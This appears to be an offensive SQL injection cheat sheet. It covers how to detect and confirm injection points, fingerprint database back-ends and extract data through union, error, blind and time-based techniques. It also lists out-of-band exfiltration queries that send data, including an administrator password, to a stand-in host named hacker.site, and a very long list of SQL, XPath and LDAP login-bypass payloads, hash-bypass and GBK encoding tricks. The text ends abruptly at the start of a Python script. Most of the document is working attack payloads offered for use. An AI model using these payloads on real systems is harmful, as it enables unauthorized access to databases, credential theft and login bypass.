# SQL Injection
SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour.

## Entry point detection
the first thing you need to do is how to inject data in the query without breaking it. To do so you first need to find how to escape from the current context.
```bash
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

Then, you need to know how to fix the query so there isn't errors.

**Comments**
```bash
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```

## Confirming with logical operations
> For example: if the GET parameter ?username=Peter returns the same content as **?username=Peter' or '1'='1** then, you found a SQL injection, OR If **?id=1 returns the same as ?id=2-1**, SQLinjection.
```bash
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false

```

This word-list was created to try to confirm SQLinjections in the proposed way:
```bash
true
1
1>0
2-1
0+1
1*1
1%2
1 & 1
1&1
1 && 2
1&&2
-1 || 1
-1||1
-1 oR 1=1
1 aND 1=1
(1)oR(1=1)
(1)aND(1=1)
-1/**/oR/**/1=1
1/**/aND/**/1=1
1'
1'>'0
2'-'1
0'+'1
1'*'1
1'%'2
1'&'1'='1
1'&&'2'='1
-1'||'1'='1
-1'oR'1'='1
1'aND'1'='1
1"
1">"0
2"-"1
0"+"1
1"*"1
1"%"2
1"&"1"="1
1"&&"2"="1
-1"||"1"="1
-1"oR"1"="1
1"aND"1"="1
1`
1`>`0
2`-`1
0`+`1
1`*`1
1`%`2
1`&`1`=`1
1`&&`2`=`1
-1`||`1`=`1
-1`oR`1`=`1
1`aND`1`=`1
1')>('0
2')-('1
0')+('1
1')*('1
1')%('2
1')&'1'=('1
1')&&'1'=('1
-1')||'1'=('1
-1')oR'1'=('1
1')aND'1'=('1
1")>("0
2")-("1
0")+("1
1")*("1
1")%("2
1")&"1"=("1
1")&&"1"=("1
-1")||"1"=("1
-1")oR"1"=("1
1")aND"1"=("1
1`)>(`0
2`)-(`1
0`)+(`1
1`)*(`1
1`)%(`2
1`)&`1`=(`1
1`)&&`1`=(`1
-1`)||`1`=(`1
-1`)oR`1`=(`1
1`)aND`1`=(`1
```

## Confirming with Timing
In some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load.
```bash
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
> In some cases the sleep functions won't be allowed. Then, instead of using those functions you could make the query perform complex operations that will take several seconds.

## Identifying Back-end
You could use the sleep functions of the previous section or these ones:
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

## Exploiting Union Based
### Detecting number of columns
If you can see the output of the query this is the best way to exploit it.

Two methods are typically used for this purpose:
* Order/Group by
Keep incrementing the number until you get a False response.
```bash
# ORDER BY
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True


# GROUP BY
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
                        #-1' UNION SELECT 1,2,3--+    True

```

* UNION SELECT
Select more and more null values until the query is correct:
```bash
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
> You should use nullvalues as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case.

## Extract database names, table names and column names
```bash
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```

## Exploiting Error based
If for some reason you cannot see the output of the query but you can see the error messages, you can make this error messages to ex-filtrate data from the database.
```bash
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```

## Exploiting Blind SQLi
In this case you cannot see the results of the query or the errors, but you can distinguished when the query return a true or a false response because there are different contents on the page.
```bash
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```

## Exploiting Error Blind SQLi
This is the same case as before but instead of distinguish between a true/false response from the query you can distinguish between an error in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:
```bash
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```

## Exploiting Time Based SQLi
In this case there isn't any way to distinguish the response of the query based on the context of the page. But, you can make the page take longer to load if the guessed character is correct.
```bash
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```

## Stacked Queries
You can use stacked queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.

**Oracle** doesn't support stacked queries. **MySQL, Microsoft and PostgreSQL** support them: `QUERY-1-HERE; QUERY-2-HERE`


## Out of band Exploitation
try to make the database ex-filtrate the info to an external host controlled by you.
```bash
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```

## Out of band data exfiltration via XXE
```bash
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```

## Authentication bypass
> This list contains payloads to bypass the login via XPath, LDAP and SQL injection(in that order).
The way to use this list is to put the first 200 lines as the username and password. Then, put the complete list in the username first and then in the password inputs while putting some password (like Pass1234.) or some known username (like admin).
> 
```bash
admin
password
1234
123456
root
toor
test
guest
' or '1'='1
' or ''='
' or 1]%00
' or /* or '
' or "a" or '
' or 1 or '
' or true() or '
'or string-length(name(.))<10 or'
'or contains(name,'adm') or'
'or contains(.,'adm') or'
'or position()=2 or'
admin' or '
admin' or '1'='2
*
*)(&
*)(|(&
pwd)
*)(|(*
*))%00
admin)(&)
pwd
admin)(!(&(|
pwd))
admin))(|(|
1234
'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
==
=
'
' --
' #
' –
'--
'/*
'#
" --
" #
"/*
' and 1='1
' and a='a
or true
' or ''='
" or ""="
1′) and '1′='1–
' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055
" AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055
' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220
" AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220
and 1=1
and 1=1–
' and 'one'='one
' and 'one'='one–
' group by password having 1=1--
' group by userid having 1=1--
' group by username having 1=1--
like '%'
or 0=0 --
or 0=0 #
or 0=0 –
' or         0=0 #
' or 0=0 --
' or 0=0 #
' or 0=0 –
" or 0=0 --
" or 0=0 #
" or 0=0 –
%' or '0'='0
or 1=1–
' or 1=1--
' or '1'='1
' or '1'='1'--
' or '1'='1'/*
' or '1'='1'#
' or '1′='1
' or 1=1
' or 1=1 --
' or 1=1 –
' or 1=1;#
' or 1=1/*
' or 1=1#
' or 1=1–
') or '1'='1
') or '1'='1--
') or '1'='1'--
') or '1'='1'/*
') or '1'='1'#
') or ('1'='1
') or ('1'='1--
') or ('1'='1'--
') or ('1'='1'/*
') or ('1'='1'#
'or'1=1
'or'1=1′
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 –
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1–
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1′='1–
) or ('1′='1–
' or 1=1 LIMIT 1;#
'or 1=1 or ''='
"or 1=1 or ""="
' or a=a--
' or a=a–
" or "a"="a
") or ("a"="a
') or ('a'='a and hi") or ("a"="a
' or 'one'='one
' or 'one'='one–
' or uid like '%
' or uname like '%
' or userid like '%
' or user like '%
' or username like '%
') or ('x'='x
' OR 'x'='x'#;
'=' 'or' and '=' 'or'
' UNION ALL SELECT 1, @@version;#
' UNION ALL SELECT system_user(),user();#
' UNION select table_schema,table_name FROM information_Schema.tables;#
admin' and substring(password/text(),1,1)='7
' and substring(password/text(),1,1)='7
"
'-- 2
"-- 2
'='
0'&lt;'2
"="
0"&lt;"2
')
")
')-- 2
')/*
')#
")-- 2
") #
")/*
')-('
')&('
')^('
')*('
')=('
0')&lt;('2
")-("
")&("
")^("
")*("
")=("
0")&lt;("2
'-''-- 2
'-''#
'-''/*
'&''-- 2
'&''#
'&''/*
'^''-- 2
'^''#
'^''/*
'*''-- 2
'*''#
'*''/*
'=''-- 2
'=''#
'=''/*
0'&lt;'2'-- 2
0'&lt;'2'#
0'&lt;'2'/*
"-""-- 2
"-""#
"-""/*
"&""-- 2
"&""#
"&""/*
"^""-- 2
"^""#
"^""/*
"*""-- 2
"*""#
"*""/*
"=""-- 2
"=""#
"=""/*
0"&lt;"2"-- 2
0"&lt;"2"#
0"&lt;"2"/*
')-''-- 2
')-''#
')-''/*
')&''-- 2
')&''#
')&''/*
')^''-- 2
')^''#
')^''/*
')*''-- 2
')*''#
')*''/*
')=''-- 2
')=''#
')=''/*
0')&lt;'2'-- 2
0')&lt;'2'#
0')&lt;'2'/*
")-""-- 2
")-""#
")-""/*
")&""-- 2
")&""#
")&""/*
")^""-- 2
")^""#
")^""/*
")*""-- 2
")*""#
")*""/*
")=""-- 2
")=""#
")=""/*
0")&lt;"2-- 2
0")&lt;"2#
0")&lt;"2/*
'oR'2
'oR'2'-- 2
'oR'2'#
'oR'2'/*
'oR'2'oR'
'oR(2)-- 2
'oR(2)#
'oR(2)/*
'oR(2)oR'
'oR 2-- 2
'oR 2#
'oR 2/*
'oR 2 oR'
'oR/**/2-- 2
'oR/**/2#
'oR/**/2/*
'oR/**/2/**/oR'
"oR"2
"oR"2"-- 2
"oR"2"#
"oR"2"/*
"oR"2"oR"
"oR(2)-- 2
"oR(2)#
"oR(2)/*
"oR(2)oR"
"oR 2-- 2
"oR 2#
"oR 2/*
"oR 2 oR"
"oR/**/2-- 2
"oR/**/2#
"oR/**/2/*
"oR/**/2/**/oR"
'oR'2'='2
'oR'2'='2'oR'
'oR'2'='2'-- 2
'oR'2'='2'#
'oR'2'='2'/*
'oR 2=2-- 2
'oR 2=2#
'oR 2=2/*
'oR 2=2 oR'
'oR/**/2=2-- 2
'oR/**/2=2#
'oR/**/2=2/*
'oR/**/2=2/**/oR'
'oR(2)=2-- 2
'oR(2)=2#
'oR(2)=2/*
'oR(2)=(2)oR'
'oR'2'='2' LimIT 1-- 2
'oR'2'='2' LimIT 1#
'oR'2'='2' LimIT 1/*
'oR(2)=(2)LimIT(1)-- 2
'oR(2)=(2)LimIT(1)#
'oR(2)=(2)LimIT(1)/*
"oR"2"="2
"oR"2"="2"oR"
"oR"2"="2"-- 2
"oR"2"="2"#
"oR"2"="2"/*
"oR 2=2-- 2
"oR 2=2#
"oR 2=2/*
"oR 2=2 oR"
"oR/**/2=2-- 2
"oR/**/2=2#
"oR/**/2=2/*
"oR/**/2=2/**/oR"
"oR(2)=2-- 2
"oR(2)=2#
"oR(2)=2/*
"oR(2)=(2)oR"
"oR"2"="2" LimIT 1-- 2
"oR"2"="2" LimIT 1#
"oR"2"="2" LimIT 1/*
"oR(2)=(2)LimIT(1)-- 2
"oR(2)=(2)LimIT(1)#
"oR(2)=(2)LimIT(1)/*
'oR true-- 2
'oR true#
'oR true/*
'oR true oR'
'oR(true)-- 2
'oR(true)#
'oR(true)/*
'oR(true)oR'
'oR/**/true-- 2
'oR/**/true#
'oR/**/true/*
'oR/**/true/**/oR'
"oR true-- 2
"oR true#
"oR true/*
"oR true oR"
"oR(true)-- 2
"oR(true)#
"oR(true)/*
"oR(true)oR"
"oR/**/true-- 2
"oR/**/true#
"oR/**/true/*
"oR/**/true/**/oR"
'oR'2'LiKE'2
'oR'2'LiKE'2'-- 2
'oR'2'LiKE'2'#
'oR'2'LiKE'2'/*
'oR'2'LiKE'2'oR'
'oR(2)LiKE(2)-- 2
'oR(2)LiKE(2)#
'oR(2)LiKE(2)/*
'oR(2)LiKE(2)oR'
"oR"2"LiKE"2
"oR"2"LiKE"2"-- 2
"oR"2"LiKE"2"#
"oR"2"LiKE"2"/*
"oR"2"LiKE"2"oR"
"oR(2)LiKE(2)-- 2
"oR(2)LiKE(2)#
"oR(2)LiKE(2)/*
"oR(2)LiKE(2)oR"
admin
admin'-- 2
admin'#
admin"-- 2
admin"#
ffifdyop
' UniON SElecT 1,2-- 2
' UniON SElecT 1,2,3-- 2
' UniON SElecT 1,2,3,4-- 2
' UniON SElecT 1,2,3,4,5-- 2
' UniON SElecT 1,2#
' UniON SElecT 1,2,3#
' UniON SElecT 1,2,3,4#
' UniON SElecT 1,2,3,4,5#
'UniON(SElecT(1),2)-- 2
'UniON(SElecT(1),2,3)-- 2
'UniON(SElecT(1),2,3,4)-- 2
'UniON(SElecT(1),2,3,4,5)-- 2
'UniON(SElecT(1),2)#
'UniON(SElecT(1),2,3)#
'UniON(SElecT(1),2,3,4)#
'UniON(SElecT(1),2,3,4,5)#
" UniON SElecT 1,2-- 2
" UniON SElecT 1,2,3-- 2
" UniON SElecT 1,2,3,4-- 2
" UniON SElecT 1,2,3,4,5-- 2
" UniON SElecT 1,2#
" UniON SElecT 1,2,3#
" UniON SElecT 1,2,3,4#
" UniON SElecT 1,2,3,4,5#
"UniON(SElecT(1),2)-- 2
"UniON(SElecT(1),2,3)-- 2
"UniON(SElecT(1),2,3,4)-- 2
"UniON(SElecT(1),2,3,4,5)-- 2
"UniON(SElecT(1),2)#
"UniON(SElecT(1),2,3)#
"UniON(SElecT(1),2,3,4)#
"UniON(SElecT(1),2,3,4,5)#
'||'2
'||2-- 2
'||'2'||'
'||2#
'||2/*
'||2||'
"||"2
"||2-- 2
"||"2"||"
"||2#
"||2/*
"||2||"
'||'2'='2
'||'2'='2'||'
'||2=2-- 2
'||2=2#
'||2=2/*
'||2=2||'
"||"2"="2
"||"2"="2"||"
"||2=2-- 2
"||2=2#
"||2=2/*
"||2=2||"
'||2=(2)LimIT(1)-- 2
'||2=(2)LimIT(1)#
'||2=(2)LimIT(1)/*
"||2=(2)LimIT(1)-- 2
"||2=(2)LimIT(1)#
"||2=(2)LimIT(1)/*
'||true-- 2
'||true#
'||true/*
'||true||'
"||true-- 2
"||true#
"||true/*
"||true||"
'||'2'LiKE'2
'||'2'LiKE'2'-- 2
'||'2'LiKE'2'#
'||'2'LiKE'2'/*
'||'2'LiKE'2'||'
'||(2)LiKE(2)-- 2
'||(2)LiKE(2)#
'||(2)LiKE(2)/*
'||(2)LiKE(2)||'
"||"2"LiKE"2
"||"2"LiKE"2"-- 2
"||"2"LiKE"2"#
"||"2"LiKE"2"/*
"||"2"LiKE"2"||"
"||(2)LiKE(2)-- 2
"||(2)LiKE(2)#
"||(2)LiKE(2)/*
"||(2)LiKE(2)||"
')oR('2
')oR'2'-- 2
')oR'2'#
')oR'2'/*
')oR'2'oR('
')oR(2)-- 2
')oR(2)#
')oR(2)/*
')oR(2)oR('
')oR 2-- 2
')oR 2#
')oR 2/*
')oR 2 oR('
')oR/**/2-- 2
')oR/**/2#
')oR/**/2/*
')oR/**/2/**/oR('
")oR("2
")oR"2"-- 2
")oR"2"#
")oR"2"/*
")oR"2"oR("
")oR(2)-- 2
")oR(2)#
")oR(2)/*
")oR(2)oR("
")oR 2-- 2
")oR 2#
")oR 2/*
")oR 2 oR("
")oR/**/2-- 2
")oR/**/2#
")oR/**/2/*
")oR/**/2/**/oR("
')oR'2'=('2
')oR'2'='2'oR('
')oR'2'='2'-- 2
')oR'2'='2'#
')oR'2'='2'/*
')oR 2=2-- 2
')oR 2=2#
')oR 2=2/*
')oR 2=2 oR('
')oR/**/2=2-- 2
')oR/**/2=2#
')oR/**/2=2/*
')oR/**/2=2/**/oR('
')oR(2)=2-- 2
')oR(2)=2#
')oR(2)=2/*
')oR(2)=(2)oR('
')oR'2'='2' LimIT 1-- 2
')oR'2'='2' LimIT 1#
')oR'2'='2' LimIT 1/*
')oR(2)=(2)LimIT(1)-- 2
')oR(2)=(2)LimIT(1)#
')oR(2)=(2)LimIT(1)/*
")oR"2"=("2
")oR"2"="2"oR("
")oR"2"="2"-- 2
")oR"2"="2"#
")oR"2"="2"/*
")oR 2=2-- 2
")oR 2=2#
")oR 2=2/*
")oR 2=2 oR("
")oR/**/2=2-- 2
")oR/**/2=2#
")oR/**/2=2/*
")oR/**/2=2/**/oR("
")oR(2)=2-- 2
")oR(2)=2#
")oR(2)=2/*
")oR(2)=(2)oR("
")oR"2"="2" LimIT 1-- 2
")oR"2"="2" LimIT 1#
")oR"2"="2" LimIT 1/*
")oR(2)=(2)LimIT(1)-- 2
")oR(2)=(2)LimIT(1)#
")oR(2)=(2)LimIT(1)/*
')oR true-- 2
')oR true#
')oR true/*
')oR true oR('
')oR(true)-- 2
')oR(true)#
')oR(true)/*
')oR(true)oR('
')oR/**/true-- 2
')oR/**/true#
')oR/**/true/*
')oR/**/true/**/oR('
")oR true-- 2
")oR true#
")oR true/*
")oR true oR("
")oR(true)-- 2
")oR(true)#
")oR(true)/*
")oR(true)oR("
")oR/**/true-- 2
")oR/**/true#
")oR/**/true/*
")oR/**/true/**/oR("
')oR'2'LiKE('2
')oR'2'LiKE'2'-- 2
')oR'2'LiKE'2'#
')oR'2'LiKE'2'/*
')oR'2'LiKE'2'oR('
')oR(2)LiKE(2)-- 2
')oR(2)LiKE(2)#
')oR(2)LiKE(2)/*
')oR(2)LiKE(2)oR('
")oR"2"LiKE("2
")oR"2"LiKE"2"-- 2
")oR"2"LiKE"2"#
")oR"2"LiKE"2"/*
")oR"2"LiKE"2"oR("
")oR(2)LiKE(2)-- 2
")oR(2)LiKE(2)#
")oR(2)LiKE(2)/*
")oR(2)LiKE(2)oR("
admin')-- 2
admin')#
admin')/*
admin")-- 2
admin")#
') UniON SElecT 1,2-- 2
') UniON SElecT 1,2,3-- 2
') UniON SElecT 1,2,3,4-- 2
') UniON SElecT 1,2,3,4,5-- 2
') UniON SElecT 1,2#
') UniON SElecT 1,2,3#
') UniON SElecT 1,2,3,4#
') UniON SElecT 1,2,3,4,5#
')UniON(SElecT(1),2)-- 2
')UniON(SElecT(1),2,3)-- 2
')UniON(SElecT(1),2,3,4)-- 2
')UniON(SElecT(1),2,3,4,5)-- 2
')UniON(SElecT(1),2)#
')UniON(SElecT(1),2,3)#
')UniON(SElecT(1),2,3,4)#
')UniON(SElecT(1),2,3,4,5)#
") UniON SElecT 1,2-- 2
") UniON SElecT 1,2,3-- 2
") UniON SElecT 1,2,3,4-- 2
") UniON SElecT 1,2,3,4,5-- 2
") UniON SElecT 1,2#
") UniON SElecT 1,2,3#
") UniON SElecT 1,2,3,4#
") UniON SElecT 1,2,3,4,5#
")UniON(SElecT(1),2)-- 2
")UniON(SElecT(1),2,3)-- 2
")UniON(SElecT(1),2,3,4)-- 2
")UniON(SElecT(1),2,3,4,5)-- 2
")UniON(SElecT(1),2)#
")UniON(SElecT(1),2,3)#
")UniON(SElecT(1),2,3,4)#
")UniON(SElecT(1),2,3,4,5)#
')||('2
')||2-- 2
')||'2'||('
')||2#
')||2/*
')||2||('
")||("2
")||2-- 2
")||"2"||("
")||2#
")||2/*
")||2||("
')||'2'=('2
')||'2'='2'||('
')||2=2-- 2
')||2=2#
')||2=2/*
')||2=2||('
")||"2"=("2
")||"2"="2"||("
")||2=2-- 2
")||2=2#
")||2=2/*
")||2=2||("
')||2=(2)LimIT(1)-- 2
')||2=(2)LimIT(1)#
')||2=(2)LimIT(1)/*
")||2=(2)LimIT(1)-- 2
")||2=(2)LimIT(1)#
")||2=(2)LimIT(1)/*
')||true-- 2
')||true#
')||true/*
')||true||('
")||true-- 2
")||true#
")||true/*
")||true||("
')||'2'LiKE('2
')||'2'LiKE'2'-- 2
')||'2'LiKE'2'#
')||'2'LiKE'2'/*
')||'2'LiKE'2'||('
')||(2)LiKE(2)-- 2
')||(2)LiKE(2)#
')||(2)LiKE(2)/*
')||(2)LiKE(2)||('
")||"2"LiKE("2
")||"2"LiKE"2"-- 2
")||"2"LiKE"2"#
")||"2"LiKE"2"/*
")||"2"LiKE"2"||("
")||(2)LiKE(2)-- 2
")||(2)LiKE(2)#
")||(2)LiKE(2)/*
")||(2)LiKE(2)||("
' UnION SELeCT 1,2`
' UnION SELeCT 1,2,3`
' UnION SELeCT 1,2,3,4`
' UnION SELeCT 1,2,3,4,5`
" UnION SELeCT 1,2`
" UnION SELeCT 1,2,3`
" UnION SELeCT 1,2,3,4`
" UnION SELeCT 1,2,3,4,5`
' or 1=1 limit 1 -- -+
'="or'
Pass1234.
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
Pass1234." and 1=0 union select "admin",sha("Pass1234.
Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
%A8%27 Or 1=1-- 2
%8C%A8%27 Or 1=1-- 2
%bf' Or 1=1 -- 2
%A8%27 Or 1-- 2
%8C%A8%27 Or 1-- 2
%bf' Or 1-- 2
%A8%27Or(1)-- 2
%8C%A8%27Or(1)-- 2
%bf'Or(1)-- 2
%A8%27||1-- 2
%8C%A8%27||1-- 2
%bf'||1-- 2
%A8%27) Or 1=1-- 2
%8C%A8%27) Or 1=1-- 2
%bf') Or 1=1 -- 2
%A8%27) Or 1-- 2
%8C%A8%27) Or 1-- 2
%bf') Or 1-- 2
%A8%27)Or(1)-- 2
%8C%A8%27)Or(1)-- 2
%bf')Or(1)-- 2
%A8%27)||1-- 2
%8C%A8%27)||1-- 2
%bf')||1-- 2
```

## Authentication Bypass (Raw MD5)
When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
```bash
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Allowing an attacker to craft a string with a `true` statement such as  **' or 'SOMETHING**
```bsah
md5("ffifdyop", true) = 'or'6�]��!r,��b�
```

## Hash Authentication Bypass
```bash
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
> You should use as username each line of the list and as password always: Pass1234.
(This payloads are also included in the big list mentioned at the beginning of this section)
```bash
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658
Pass1234.' AND 1=0 UniON SeleCT 'admin', 'fe1ff105bf807478a217ad4e378dc658'#
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.
Pass1234.' AND 1=0 UniON ALL SeleCT 'admin', md5('Pass1234.')#
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234.' AND 1=0 UniON SeleCT 'admin', '5b19a9e947ca0fee49995f2a8b359e1392adbb61'#
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.
Pass1234.' and 1=0 union select 'admin',sha('Pass1234.')#
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658
Pass1234." AND 1=0 UniON SeleCT "admin", "fe1ff105bf807478a217ad4e378dc658"#
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.
Pass1234." AND 1=0 UniON ALL SeleCT "admin", md5("Pass1234.")#
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61
Pass1234." AND 1=0 UniON SeleCT "admin", "5b19a9e947ca0fee49995f2a8b359e1392adbb61"#
Pass1234." and 1=0 union select "admin",sha("Pass1234.
Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
```

## GBK Authentication Bypass
IF ' is being scaped you can use `%A8%27`, and when **'** gets scaped it will be created: `0xA80x5c0x27 (╘')`
```bash
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Python script:
```python
import requests
url = "http://example.com/index.php" 
